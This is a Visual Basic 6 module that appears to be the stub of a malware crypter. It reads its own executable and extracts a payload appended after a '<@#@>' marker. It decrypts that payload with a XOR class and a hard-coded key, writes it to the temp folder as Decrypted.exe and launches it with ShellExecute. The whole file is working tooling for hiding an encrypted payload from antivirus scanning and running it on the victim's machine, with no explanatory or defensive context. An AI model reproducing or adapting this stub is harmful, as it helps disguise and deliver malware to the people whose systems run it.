Attribute VB_Name = "ModMain"
Const FileSplit = "<@#@>"
Const Pass = "RC4Passwort"
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
     ByVal hwnd As Long, _
     ByVal lpOperation As String, _
     ByVal lpFile As String, _
     ByVal lpParameters As String, _
     ByVal lpDirectory As String, _
     ByVal nShowCmd As Long) As Long
Public Sub Main()
Dim sStub As String, sFile As String
Dim cCrypt  As New clsSimpleXOR
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
sStub = Space(LOF(1))
Get #1, , sStub
Close #1
sFile = Split(sStub, FileSplit)(1)
Open Environ("tmp") & "\Decrypted.exe" For Binary As #1
Put #1, , cCrypt.DecryptString(sFile, Pass)
Close #1
Call ShellExecute(0, vbNullString, Environ("tmp") & "\Decrypted.exe", vbNullString, vbNullString, 1)

End Sub
